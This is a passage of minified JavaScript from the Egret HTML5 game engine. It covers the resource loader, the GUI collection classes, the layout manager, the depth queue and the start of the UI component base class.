new t.ResourceConfig,this.resLoader=new t.ResourceLoader,this.resLoader.callBack=this.onResourceItemComp,this.resLoader.resInstance=this,this.resLoader.addEventListener(t.ResourceEvent.GROUP_COMPLETE,this.onGroupComp,this)},i.prototype.loadConfig=function(t,e,i){void 0===i&&(i="json"),this.configItemList.push({url:t,resourceRoot:e,type:i}),this.callLaterFlag||(egret.callLater(this.startLoadConfig,this),this.callLaterFlag=!0)},i.prototype.startLoadConfig=function(){this.callLaterFlag=!1;var e=this.configItemList;this.configItemList=[],this.loadingConfigList=e;for(var n=e.length,r=[],s=0;s<n;s++){var o=e[s],o=new t.ResourceItem(o.url,o.url,o.type);r.push(o)}this.resLoader.loadGroup(r,i.GROUP_CONFIG,Number.MAX_VALUE)},i.prototype.isGroupLoaded=function(t){return-1!=this.loadedGroups.indexOf(t)},i.prototype.getGroupByName=function(t){return this.resConfig.getGroupByName(t)},i.prototype.loadGroup=function(t,e){if(void 0===e&&(e=0),-1==this.loadedGroups.indexOf(t)&&!this.resLoader.isGroupInLoading(t))if(this.configComplete){var i=this.resConfig.getGroupByName(t);this.resLoader.loadGroup(i,t,e)}else this.groupNameList.push({name:t,priority:e})},i.prototype.createGroup=function(t,e,i){if(void 0===i&&(i=!1),i){var n=this.loadedGroups.indexOf(t);-1!=n&&this.loadedGroups.splice(n,1)}return this.resConfig.createGroup(t,e,i)},i.prototype.onGroupComp=function(e){if(e.groupName==i.GROUP_CONFIG){e=this.loadingConfigList.length;for(var n=0;n<e;n++){var r=this.loadingConfigList[n],s=this.getAnalyzerByType(r.type),o=s.getRes(r.url);s.destroyRes(r.url),this.resConfig.parseConfig(o,r.resourceRoot)}for(this.configComplete=!0,this.loadingConfigList=null,t.ResourceEvent.dispatchResourceEvent(this,t.ResourceEvent.CONFIG_COMPLETE),e=(r=this.groupNameList).length,n=0;n<e;n++)s=r[n],this.loadGroup(s.name,s.priority);this.groupNameList=[]}else this.loadedGroups.push(e.groupName),this.dispatchEvent(e)},i.prototype.hasRes=function(e){var i=this.resConfig.getType(e);return""!=i||(e=t.AnalyzerBase.getStringPrefix(e),""!=(i=this.resConfig.getType(e)))},i.prototype.getRes=function(e){var i=this.resConfig.getType(e);return""==i&&(i=t.AnalyzerBase.getStringPrefix(e),""==(i=this.resConfig.getType(i)))?null:this.getAnalyzerByType(i).getRes(e)},i.prototype.getResAsync=function(e,i,n){var r=this.resConfig.getType(e),s=this.resConfig.getName(e);""!=r||(s=t.AnalyzerBase.getStringPrefix(e),""!=(r=this.resConfig.getType(s)))?(r=this.getAnalyzerByType(r).getRes(e))?i.call(n,r):(e={key:e,compFunc:i,thisObject:n},this.asyncDic[s]?this.asyncDic[s].push(e):(this.asyncDic[s]=[e],s=this.resConfig.getResourceItem(s),this.resLoader.loadItem(s))):i.call(n,null)},i.prototype.getResByUrl=function(e,i,n,r){if(void 0===r&&(r=""),e){r||(r=this.getTypeByUrl(e));var s=this.getAnalyzerByType(r).getRes(e);s?i.call(n,s):(i={key:e,compFunc:i,thisObject:n},this.asyncDic[e]?this.asyncDic[e].push(i):(this.asyncDic[e]=[i],e=new t.ResourceItem(e,e,r),this.resLoader.loadItem(e)))}else i.call(n,null)},i.prototype.getTypeByUrl=function(e){switch((e=e.substr(e.lastIndexOf(".")+1))&&(e=e.toLowerCase()),e){case t.ResourceItem.TYPE_XML:case t.ResourceItem.TYPE_JSON:case t.ResourceItem.TYPE_SHEET:break;case"png":case"jpg":case"gif":e=t.ResourceItem.TYPE_IMAGE;break;case"fnt":e=t.ResourceItem.TYPE_FONT;break;case"txt":e=t.ResourceItem.TYPE_TEXT;break;case"mp3":case"ogg":case"mpeg":case"wav":case"m4a":case"mp4":case"aiff":case"wma":case"mid":e=t.ResourceItem.TYPE_SOUND;break;default:e=t.ResourceItem.TYPE_BIN}return e},i.prototype.onResourceItemComp=function(t){var e=this.asyncDic[t.name];delete this.asyncDic[t.name],t=this.getAnalyzerByType(t.type);for(var i=e.length,n=0;n<i;n++){var r=e[n],s=t.getRes(r.key);r.compFunc.call(r.thisObject,s)}},i.prototype.destroyRes=function(t){var e=this.resConfig.getRawGroupByName(t);if(e){var i=this.loadedGroups.indexOf(t);-1!=i&&this.loadedGroups.splice(i,1),t=e.length;for(var n=0;n<t;n++){(i=e[n]).loaded=!1;var r=this.getAnalyzerByType(i.type);r.destroyRes(i.name)}return!0}return""!=(e=this.resConfig.getType(t))&&(i=this.resConfig.getRawResourceItem(t),i.loaded=!1,(r=this.getAnalyzerByType(e)).destroyRes(t))},i.prototype.setMaxLoadingThread=function(t){1>t&&(t=1),this.resLoader.thread=t},i.GROUP_CONFIG="RES__CONFIG",i}(egret.EventDispatcher);e.prototype.__class__="Resource";var i=new e}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(t){function i(e){void 0===e&&(e=null),t.call(this),this._source=e||[]}return __extends(i,t),Object.defineProperty(i.prototype,"source",{get:function(){return this._source},set:function(t){t||(t=[]),this._source=t,this.dispatchCoEvent(e.CollectionEventKind.RESET)},enumerable:!0,configurable:!0}),i.prototype.refresh=function(){this.dispatchCoEvent(e.CollectionEventKind.REFRESH)},i.prototype.contains=function(t){return-1!=this.getItemIndex(t)},i.prototype.checkIndex=function(t){if(0>t||t>=this._source.length)throw new RangeError('索引:"'+t+'"超出集合元素索引范围')},Object.defineProperty(i.prototype,"length",{get:function(){return this._source.length},enumerable:!0,configurable:!0}),i.prototype.addItem=function(t){this._source.push(t),this.dispatchCoEvent(e.CollectionEventKind.ADD,this._source.length-1,-1,[t])},i.prototype.addItemAt=function(t,i){if(0>i||i>this._source.length)throw new RangeError('索引:"'+i+'"超出集合元素索引范围');this._source.splice(i,0,t),this.dispatchCoEvent(e.CollectionEventKind.ADD,i,-1,[t])},i.prototype.getItemAt=function(t){return this._source[t]},i.prototype.getItemIndex=function(t){for(var e=this._source.length,i=0;i<e;i++)if(this._source[i]===t)return i;return-1},i.prototype.itemUpdated=function(t){var i=this.getItemIndex(t);-1!=i&&this.dispatchCoEvent(e.CollectionEventKind.UPDATE,i,-1,[t])},i.prototype.removeAll=function(){var t=this._source.concat();this._source.length=0,this.dispatchCoEvent(e.CollectionEventKind.REMOVE,0,-1,t)},i.prototype.removeItemAt=function(t){this.checkIndex(t);var i=this._source.splice(t,1)[0];return this.dispatchCoEvent(e.CollectionEventKind.REMOVE,t,-1,[i]),i},i.prototype.replaceItemAt=function(t,i){this.checkIndex(i);var n=this._source.splice(i,1,t)[0];return this.dispatchCoEvent(e.CollectionEventKind.REPLACE,i,-1,[t],[n]),n},i.prototype.replaceAll=function(t){t||(t=[]);for(var e=t.length,i=this._source.length,n=e;n<i;n++)this.removeItemAt(e);for(n=0;n<e;n++)n>=i?this.addItemAt(t[n],n):this.replaceItemAt(t[n],n);this._source=t},i.prototype.moveItemAt=function(t,i){this.checkIndex(t),this.checkIndex(i);var n=this._source.splice(t,1)[0];return this._source.splice(i,0,n),this.dispatchCoEvent(e.CollectionEventKind.MOVE,i,t,[n]),n},i.prototype.dispatchCoEvent=function(t,i,n,r,s){void 0===t&&(t=null),void 0===i&&(i=-1),void 0===n&&(n=-1),void 0===r&&(r=null),void 0===s&&(s=null),e.CollectionEvent.dispatchCollectionEvent(this,e.CollectionEvent.COLLECTION_CHANGE,t,i,n,r,s)},i}(t.EventDispatcher);e.ArrayCollection=i,i.prototype.__class__="egret.gui.ArrayCollection"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(t){function i(e,i){void 0===e&&(e="children"),void 0===i&&(i="parent"),t.call(this),this.nodeList=[],this._openNodes=[],this._showRoot=!1,this.childrenKey=e,this.parentKey=i}return __extends(i,t),Object.defineProperty(i.prototype,"source",{get:function(){return this._source},set:function(t){this._source=t,this._openNodes=[],this.nodeList=[],this._source&&(this._showRoot?this.nodeList.push(this._source):(this._openNodes=[this._source],this.addChildren(this._source,this.nodeList))),this.dispatchCoEvent(e.CollectionEventKind.RESET)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"openNodes",{get:function(){return this._openNodes.concat()},set:function(t){this._openNodes=t?t.concat():[],this.refresh()},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"length",{get:function(){return this.nodeList.length},enumerable:!0,configurable:!0}),i.prototype.getItemAt=function(t){return this.nodeList[t]},i.prototype.getItemIndex=function(t){for(var e=this.nodeList.length,i=0;i<e;i++)if(this.nodeList[i]===t)return i;return-1},i.prototype.itemUpdated=function(t){var i=this.getItemIndex(t);-1!=i&&this.dispatchCoEvent(e.CollectionEventKind.UPDATE,i,-1,[t])},i.prototype.removeItem=function(t){if(this.isItemOpen(t)&&this.closeNode(t),t){var i=t[this.parentKey];if(i&&(i=i[this.childrenKey])){var n=i.indexOf(t);-1!=n&&i.splice(n,1),t[this.parentKey]=null,-1!=(n=this.nodeList.indexOf(t))&&(this.nodeList.splice(n,1),this.dispatchCoEvent(e.CollectionEventKind.REMOVE,n,-1,[t]))}}},Object.defineProperty(i.prototype,"showRoot",{get:function(){return this._showRoot},set:function(t){this._showRoot!=t&&(this._showRoot=t,this._source&&(this._showRoot?this.nodeList.splice(0,0,this._source):(this.nodeList.shift(),-1==this.openNodes.indexOf(this._source)&&this.openNodes.push(this._source)),this.refresh()))},enumerable:!0,configurable:!0}),i.prototype.addChildren=function(t,e){if(t.hasOwnProperty(this.childrenKey)&&-1!=this._openNodes.indexOf(t))for(var i=t[this.childrenKey],n=i.length,r=0;r<n;r++){var s=i[r];e.push(s),this.addChildren(s,e)}},i.prototype.hasChildren=function(t){return!!t.hasOwnProperty(this.childrenKey)&&0<t[this.childrenKey].length},i.prototype.isItemOpen=function(t){return-1!=this._openNodes.indexOf(t)},i.prototype.expandItem=function(t,e){void 0===e&&(e=!0),e?this.openNode(t):this.closeNode(t)},i.prototype.openNode=function(t){if(-1==this._openNodes.indexOf(t)){this._openNodes.push(t);var i=this.nodeList.indexOf(t);if(-1!=i){var n=[];this.addChildren(t,n);for(var r=i;n.length;){r++;var s=n.shift();this.nodeList.splice(r,0,s),this.dispatchCoEvent(e.CollectionEventKind.ADD,r,-1,[s])}this.dispatchCoEvent("open",i,i,[t])}}},i.prototype.closeNode=function(t){var i=this._openNodes.indexOf(t);if(-1!=i){var n=[];if(this.addChildren(t,n),this._openNodes.splice(i,1),-1!=(i=this.nodeList.indexOf(t))){for(i++;n.length;){var r=this.nodeList.splice(i,1)[0];this.dispatchCoEvent(e.CollectionEventKind.REMOVE,i,-1,[r]),n.shift()}i--,this.dispatchCoEvent(e.CollectionEventKind.CLOSE,i,i,[t])}}},i.prototype.getDepth=function(t){var e=0;for(t=t[this.parentKey];t;)e++,t=t[this.parentKey];return 0<e&&!this._showRoot&&e--,e},i.prototype.refresh=function(){this.nodeList=[],this._source&&(this._showRoot&&this.nodeList.push(this._source),this.addChildren(this._source,this.nodeList)),this.dispatchCoEvent(e.CollectionEventKind.REFRESH)},i.prototype.dispatchCoEvent=function(t,i,n,r,s){void 0===t&&(t=null),void 0===i&&(i=-1),void 0===n&&(n=-1),void 0===r&&(r=null),void 0===s&&(s=null),e.CollectionEvent.dispatchCollectionEvent(this,e.CollectionEvent.COLLECTION_CHANGE,t,i,n,r,s)},i.assignParent=function(t,e,n){if(void 0===e&&(e="children"),void 0===n&&(n="parent"),t.hasOwnProperty(e))for(var r=t[e],s=r.length,o=0;o<s;o++){var a=r[o];try{a[n]=t}catch(t){}i.assignParent(a,e,n)}},i}(t.EventDispatcher);e.ObjectCollection=i,i.prototype.__class__="egret.gui.ObjectCollection"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.targetLevel=Number.MAX_VALUE,this.updateCompleteQueue=new e.DepthQueue,this.invalidateClientPropertiesFlag=this.invalidatePropertiesFlag=!1,this.invalidatePropertiesQueue=new e.DepthQueue,this.invalidateClientSizeFlag=this.invalidateSizeFlag=!1,this.invalidateSizeQueue=new e.DepthQueue,this.invalidateDisplayListFlag=!1,this.invalidateDisplayListQueue=new e.DepthQueue,this.listenersAttached=!1}return __extends(n,i),n.prototype.invalidateProperties=function(t){this.invalidatePropertiesFlag||(this.invalidatePropertiesFlag=!0,this.listenersAttached||this.attachListeners()),this.targetLevel<=t.nestLevel&&(this.invalidateClientPropertiesFlag=!0),this.invalidatePropertiesQueue.insert(t)},n.prototype.validateProperties=function(){for(var t=this.invalidatePropertiesQueue.shift();t;)t.parent&&(t.validateProperties(),t.updateCompletePendingFlag||(this.updateCompleteQueue.insert(t),t.updateCompletePendingFlag=!0)),t=this.invalidatePropertiesQueue.shift();this.invalidatePropertiesQueue.isEmpty()&&(this.invalidatePropertiesFlag=!1)},n.prototype.invalidateSize=function(t){this.invalidateSizeFlag||(this.invalidateSizeFlag=!0,this.listenersAttached||this.attachListeners()),this.targetLevel<=t.nestLevel&&(this.invalidateClientSizeFlag=!0),this.invalidateSizeQueue.insert(t)},n.prototype.validateSize=function(){for(var t=this.invalidateSizeQueue.pop();t;)t.parent&&(t.validateSize(),t.updateCompletePendingFlag||(this.updateCompleteQueue.insert(t),t.updateCompletePendingFlag=!0)),t=this.invalidateSizeQueue.pop();this.invalidateSizeQueue.isEmpty()&&(this.invalidateSizeFlag=!1)},n.prototype.invalidateDisplayList=function(t){this.invalidateDisplayListFlag||(this.invalidateDisplayListFlag=!0,this.listenersAttached||this.attachListeners()),this.invalidateDisplayListQueue.insert(t)},n.prototype.validateDisplayList=function(){for(var t=this.invalidateDisplayListQueue.shift();t;)t.parent&&(t.validateDisplayList(),t.updateCompletePendingFlag||(this.updateCompleteQueue.insert(t),t.updateCompletePendingFlag=!0)),t=this.invalidateDisplayListQueue.shift();this.invalidateDisplayListQueue.isEmpty()&&(this.invalidateDisplayListFlag=!1)},n.prototype.attachListeners=function(){e.UIGlobals.stage.addEventListener(t.Event.ENTER_FRAME,this.doPhasedInstantiationCallBack,this),e.UIGlobals.stage.addEventListener(t.Event.RENDER,this.doPhasedInstantiationCallBack,this),e.UIGlobals.stage.invalidate(),this.listenersAttached=!0},n.prototype.doPhasedInstantiationCallBack=function(i){e.UIGlobals.stage.removeEventListener(t.Event.ENTER_FRAME,this.doPhasedInstantiationCallBack,this),e.UIGlobals.stage.removeEventListener(t.Event.RENDER,this.doPhasedInstantiationCallBack,this),this.doPhasedInstantiation()},n.prototype.doPhasedInstantiation=function(){if(this.invalidatePropertiesFlag&&this.validateProperties(),this.invalidateSizeFlag&&this.validateSize(),this.invalidateDisplayListFlag&&this.validateDisplayList(),this.invalidatePropertiesFlag||this.invalidateSizeFlag||this.invalidateDisplayListFlag)this.attachListeners();else{this.listenersAttached=!1;for(var t=this.updateCompleteQueue.pop();t;)t.initialized||(t.initialized=!0),t.hasEventListener(e.UIEvent.UPDATE_COMPLETE)&&e.UIEvent.dispatchUIEvent(t,e.UIEvent.UPDATE_COMPLETE),t.updateCompletePendingFlag=!1,t=this.updateCompleteQueue.pop();e.UIEvent.dispatchUIEvent(this,e.UIEvent.UPDATE_COMPLETE)}},n.prototype.validateNow=function(){for(var t=0;this.listenersAttached&&100>t++;)this.doPhasedInstantiationCallBack()},n.prototype.validateClient=function(t,i){void 0===i&&(i=!1);var n,r=!1,s=this.targetLevel;for(this.targetLevel==Number.MAX_VALUE&&(this.targetLevel=t.nestLevel);!r;){for(r=!0,n=this.invalidatePropertiesQueue.removeSmallestChild(t);n;)n.parent&&(n.validateProperties(),n.updateCompletePendingFlag||(this.updateCompleteQueue.insert(n),n.updateCompletePendingFlag=!0)),n=this.invalidatePropertiesQueue.removeSmallestChild(t);for(this.invalidatePropertiesQueue.isEmpty()&&(this.invalidatePropertiesFlag=!1),this.invalidateClientPropertiesFlag=!1,n=this.invalidateSizeQueue.removeLargestChild(t);n;){if(n.parent&&(n.validateSize(),n.updateCompletePendingFlag||(this.updateCompleteQueue.insert(n),n.updateCompletePendingFlag=!0)),this.invalidateClientPropertiesFlag&&(n=this.invalidatePropertiesQueue.removeSmallestChild(t))){this.invalidatePropertiesQueue.insert(n),r=!1;break}n=this.invalidateSizeQueue.removeLargestChild(t)}if(this.invalidateSizeQueue.isEmpty()&&(this.invalidateSizeFlag=!1),this.invalidateClientSizeFlag=this.invalidateClientPropertiesFlag=!1,!i){for(n=this.invalidateDisplayListQueue.removeSmallestChild(t);n;){if(n.parent&&(n.validateDisplayList(),n.updateCompletePendingFlag||(this.updateCompleteQueue.insert(n),n.updateCompletePendingFlag=!0)),this.invalidateClientPropertiesFlag&&(n=this.invalidatePropertiesQueue.removeSmallestChild(t))){this.invalidatePropertiesQueue.insert(n),r=!1;break}if(this.invalidateClientSizeFlag&&(n=this.invalidateSizeQueue.removeLargestChild(t))){this.invalidateSizeQueue.insert(n),r=!1;break}n=this.invalidateDisplayListQueue.removeSmallestChild(t)}this.invalidateDisplayListQueue.isEmpty()&&(this.invalidateDisplayListFlag=!1)}}if(s==Number.MAX_VALUE&&(this.targetLevel=Number.MAX_VALUE,!i))for(n=this.updateCompleteQueue.removeLargestChild(t);n;)n.initialized||(n.initialized=!0),n.hasEventListener(e.UIEvent.UPDATE_COMPLETE)&&e.UIEvent.dispatchUIEvent(n,e.UIEvent.UPDATE_COMPLETE),n.updateCompletePendingFlag=!1,n=this.updateCompleteQueue.removeLargestChild(t)},n}(t.EventDispatcher);e.LayoutManager=i,i.prototype.__class__="egret.gui.LayoutManager"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(e){var i=function(){function e(){this.depthBins=[],this.minDepth=0,this.maxDepth=-1}return e.prototype.insert=function(t){var e=t.nestLevel,i=t.hashCode;this.maxDepth<this.minDepth?this.minDepth=this.maxDepth=e:(e<this.minDepth&&(this.minDepth=e),e>this.maxDepth&&(this.maxDepth=e));var r=this.depthBins[e];r?null==r.items[i]&&(r.items[i]=t,r.length++):(r=new n,this.depthBins[e]=r,r.items[i]=t,r.length++)},e.prototype.pop=function(){var t=null;if(this.minDepth<=this.maxDepth){for(var e=this.depthBins[this.maxDepth];!e||0==e.length;){if(this.maxDepth--,this.maxDepth<this.minDepth)return null;e=this.depthBins[this.maxDepth]}var i,n=e.items;for(i in n){t=n[i],this.remove(t,this.maxDepth);break}for(;(!e||0==e.length)&&(this.maxDepth--,!(this.maxDepth<this.minDepth));)e=this.depthBins[this.maxDepth]}return t},e.prototype.shift=function(){var t=null;if(this.minDepth<=this.maxDepth){for(var e=this.depthBins[this.minDepth];!e||0==e.length;){if(this.minDepth++,this.minDepth>this.maxDepth)return null;e=this.depthBins[this.minDepth]}var i,n=e.items;for(i in n){t=n[i],this.remove(t,this.minDepth);break}for(;(!e||0==e.length)&&(this.minDepth++,!(this.minDepth>this.maxDepth));)e=this.depthBins[this.minDepth]}return t},e.prototype.removeLargestChild=function(e){for(var i=this.maxDepth,n=e.nestLevel,r=e.hashCode;n<=i;){if((o=this.depthBins[i])&&0<o.length){if(i==e.nestLevel){if(o.items[r])return this.remove(e,i),e}else{var s,o=o.items;for(s in o){var a=o[s];if(a instanceof t.DisplayObject&&e instanceof t.DisplayObjectContainer&&e.contains(a))return this.remove(a,i),a}}i--}else if(i==this.maxDepth&&this.maxDepth--,--i<n)break}return null},e.prototype.removeSmallestChild=function(e){for(var i=e.nestLevel,n=e.hashCode;i<=this.maxDepth;){if((s=this.depthBins[i])&&0<s.length){if(i==e.nestLevel){if(s.items[n])return this.remove(e,i),e}else{var r,s=s.items;for(r in s){var o=s[r];if(o instanceof t.DisplayObject&&e instanceof t.DisplayObjectContainer&&e.contains(o))return this.remove(o,i),o}}i++}else if(i==this.minDepth&&this.minDepth++,++i>this.maxDepth)break}return null},e.prototype.remove=function(t,e){void 0===e&&(e=-1);var i=t.hashCode,n=this.depthBins[0<=e?e:t.nestLevel];return n&&null!=n.items[i]?(delete n.items[i],n.length--,t):null},e.prototype.removeAll=function(){this.minDepth=this.depthBins.length=0,this.maxDepth=-1},e.prototype.isEmpty=function(){return this.minDepth>this.maxDepth},e}();e.DepthQueue=i,i.prototype.__class__="egret.gui.DepthQueue";var n=function(){this.length=0,this.items=[]};e.DepthBin=n,n.prototype.__class__="egret.gui.DepthBin"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function e(){}return Object.defineProperty(e,"stage",{get:function(){return e._stage},enumerable:!0,configurable:!0}),e._initlize=function(i){e.initlized||(e._stage=i,e._layoutManager=new t.LayoutManager,e.initlized=!0)},Object.defineProperty(e,"uiStage",{get:function(){return e._uiStage},enumerable:!0,configurable:!0}),e.initlized=!1,e}();t.UIGlobals=e,e.prototype.__class__="egret.gui.UIGlobals"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.initializeCalled=this._initialized=this._updateCompletePendingFlag=!1,this._nestLevel=0,this._enabled=!0,this._minWidth=this._height=this._width=0,this._maxWidth=1e4,this._minHeight=0,this._maxHeight=1e4,this._measuredHeight=this._measuredWidth=0,this._validateNowFlag=this._invalidateDisplayListFlag=this._invalidateSizeFlag=this._invalidatePropertiesFlag=!1,this._includeInLayout=!0,this._layoutHeightExplicitlySet=this._layoutWidthExplicitlySet=!1,this.touchEnabled=!0,this.addEventListener(t.Event.ADDED_TO_STAGE,this.onAddedToStage,this),this.addEventListener(t.Event.ADDED_TO_STAGE,this.checkInvalidateFlag,this)}return __extends(n,i),n.prototype.onAddedToStage=function(i){this.removeEventListener(t.Event.ADDED_TO_STAGE,this.onAddedToStage,this),this._initialize(),e.UIGlobals._initlize(this.stage),0<this._nestLevel&&this.checkInvalidateFlag()},Object.defineProperty(n.prototype,"id",{get:function(){return this._id},set:function(t){this._id=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"isPopUp",{get:function(){return this._isPopUp},set:function(t){this._isPopUp=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"owner",{get:function(){return this._owner?this._owner:this.parent},enumerable:!0,configurable:!0}),n.prototype.ownerChanged=function(t){this._owner=t},Object.defineProperty(n.prototype,"updateCompletePendingFlag",{get:function(){return this._updateCompletePendingFlag},set:function(t){this._updateCompletePendingFlag=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"initialized",{get:function(){return this._initialized},set:function(t){this._initialized!=t&&(this._initialized=t)&&e.UIEvent.dispatchUIEvent(this,e.UIEvent.CREATION_COMPLETE)},enumerable:!0,configurable:!0}),n.prototype._initialize=function(){this.initializeCalled||(e.UIGlobals.stage&&this.removeEventListener(t.Event.ADDED_TO_STAGE,this.onAddedToStage,this),this.initializeCalled=!0,e.UIEvent.dispatchUIEvent(this,e.UIEvent.INITIALIZE),this.createChildren(),this.childrenCreated())},n.prototype.createChildren=function(){},n.prototype.childrenCreated=function(){this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList()},Object.defineProperty(n.prototype,"nestLevel",{get:function(){return this._nestLevel},set:function(e){if(this._nestLevel!=e)for(this._nestLevel=e,0==this._nestLevel?this.addEventListener(t.Event.ADDED_TO_STAGE,this.checkInvalidateFlag,this):this.removeEventListener(t.Event.ADDED_TO_STAGE,this.checkInvalidateFlag,this),e=this.numChildren-1;0<=e;e--){var i=this.getChildAt(e);null!=i&&(i.nestLevel=this._nestLevel+1)}},enumerable:!0,configurable:!0}),n.prototype._addToDisplayList=function(t,e){void 0===e&&(e=!0);var i=this.numChildren;return t.parent==this&&i--,this._addingChild(t),this._doAddChild(t,i,e),this._childAdded(t),t},n.prototype._addToDisplayListAt=function(t,e,i){return void 0===i&&(i=!0),this._addingChild(t),this._doAddChild(t,e,i),this._childAdded(t),t},n.prototype._removeFromDisplayList=function(e,i){void 0===i&&(i=!0);var n=this._children.indexOf(e);return 0<=n?(this._doRemoveChild(n,i),this._childRemoved(e),e):(t.Logger.fatal("child未被addChild到该parent"),null)},n.prototype._removeFromDisplayListAt=function(e,i){if(void 0===i&&(i=!0),0<=e&&e<this._children.length){var n=this._doRemoveChild(e,i);return this._childRemoved(n),n}return t.Logger.fatal("提供的索引超出范围"),null},n.prototype.addChild=function(t){return this._addingChild(t),i.prototype.addChild.call(this,t),this._childAdded(t),t},n.prototype.addChildAt=function(t,e){return this._addingChild(t),i.prototype.addChildAt.call(this,t,e),this._childAdded(t),t},n.prototype._addingChild=function(t){t&&"nestLevel"in t&&(t.nestLevel=this._nestLevel+1)},n.prototype._childAdded=function(t){t instanceof n&&(t._initialize(),t.checkInvalidateFlag())},n.prototype.removeChild=function(t){return i.prototype.removeChild.call(this,t),this._childRemoved(t),t},n.prototype.removeChildAt=function(t){return t=i.prototype.removeChildAt.call(this,t),this._childRemoved(t),t},n.prototype._childRemoved=function(t){t&&"nestLevel"in t&&(t.nestLevel=0)},n.prototype.checkInvalidateFlag=function(t){e.UIGlobals._layoutManager&&(this._invalidatePropertiesFlag&&e.UIGlobals._layoutManager.invalidateProperties(this),this._invalidateSizeFlag&&e.UIGlobals._layoutManager.invalidateSize(this),this._invalidateDisplayListFlag&&e.UIGlobals._layoutManager.invalidateDisplayList(this),this._validateNowFlag&&(e.UIGlobals._layoutManager.validateClient(this),this._validateNowFlag=!1))},Object.defineProperty(n.prototype,"enabled",{get:function(){return this._enabled},set:function(t){this._enabled=t},enumerable:!0,configurable:!0}),n.prototype._setWidth=function(t){this._width==t&&this._explicitWidth==t||(i.prototype._setWidth.call(this,t),isNaN(t)?this.invalidateSize():this._width=t,this.invalidateProperties(),this.invalidateDisplayList(),this.invalidateParentSizeAndDisplayList())},Object.defineProperty(n.prototype,"width",{get:function(){return this._width},set:function(t){this._setWidth(t)},enumerable:!0,configurable:!0}),n.prototype._setHeight=function(t){this._height==t&&this._explicitHeight==t||(i.prototype._setHeight.call(this,t),isNaN(t)?this.invalidateSize():this._height=t,this.invalidateProperties(),this.invalidateDisplayList(),this.invalidateParentSizeAndDisplayList())},Object.defineProperty(n.prototype,"height",{get:function(){return this._height},set:function(t){this._setHeight(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"scaleX",{get:function(){return this._scaleX},set:function(t){this._setScaleX(t)},enumerable:!0,configurable:!0}),n.prototype._setScaleX=function(t){this._scaleX!=t&&(this._scaleX=t,this.invalidateParentSizeAndDisplayList())},Object.defineProperty(n.prototype,"scaleY",{get:function(){return this._scaleY},set:function(t){this._setScaleY(t)},enumerable:!0,configurable:!0}),n.prototype._setScaleY=function(t){this._scaleY!=t&&(this._scaleY=t,this.invalidateParentSizeAndDisplayList())},Object.defineProperty(n.prototype,"minWidth",{get:function(){return this._minWidth},set:function(t){this._minWidth!=t&&(this._minWidth=t,this.invalidateSize())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"maxWidth",{get:function(){return this._maxWidth},set:function(t){this._maxWidth!=t&&(this._maxWidth=t,this.invalidateSize())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"minHeight",{get:function(){return this._minHeight},set:function(t){this._minHeight!=t&&(this._minHeight=t,this.invalidateSize())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"maxHeight",{get:function(){return this._maxHeight},set:function(t){this._maxHeight!=t&&(this._maxHeight=t,this.invalidateSize())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"measuredWidth",{get:function(){return this._measuredWidth},set:function(t){this._measuredWidth=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"measuredHeight",{get:function(){return this._measuredHeight},set:function(t){this._measuredHeight=t},enumerable:!0,configurable:!0}),n.prototype.setActualSize=function(t,e){var i=!1;this._width!=t&&(this._width=t,i=!0),this._height!=e&&(this._height=e,i=!0),i&&(this.invalidateDisplayList(),this.dispatchResizeEvent())},Object.defineProperty(n.prototype,"x",{get:function(){return this._x},set:function(t){this._x!=t&&(this._x=t,this.invalidateProperties(),this._includeInLayout&&this.parent&&this.parent instanceof n&&this.parent._childXYChanged())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"y",{get:function(){return this._y},set:function(t){this._y!=t&&(this._y=t,this.invalidateProperties(),this._includeInLayout&&this.parent&&this.parent instanceof n&&this.parent._childXYChanged())},enumerable:!0,configurable:!0}),n.prototype.invalidateProperties=function(){this._invalidatePropertiesFlag||(this._invalidatePropertiesFlag=!0,this.parent&&e.UIGlobals._layoutManager&&e.UIGlobals._layoutManager.invalidateProperties(this))},n.prototype.validateProperties=function(){this._invalidatePropertiesFlag&&(this.commitProperties(),this._invalidatePropertiesFlag=!1)},n.prototype.invalidateSize=function(){this._invalidateSizeFlag||(this._invalidateSizeFlag=!0,this.parent&&e.UIGlobals._layoutManager&&e.UIGlobals._layoutManager.invalidateSize(this))},n.prototype.validateSize=function(t){if(void 0===t&&(t=!1),t)for(t=0;t<this.numChildren;t++){var e=this.getChildAt(t);"validateSize"in e&&e.validateSize(!0)}this._invalidateSizeFlag&&(this.measureSizes()&&(this.invalidateDisplayList(),this.invalidateParentSizeAndDisplayList()),this._invalidateSizeFlag=!1)},n.prototype.measureSizes=function(){var t=!1;return 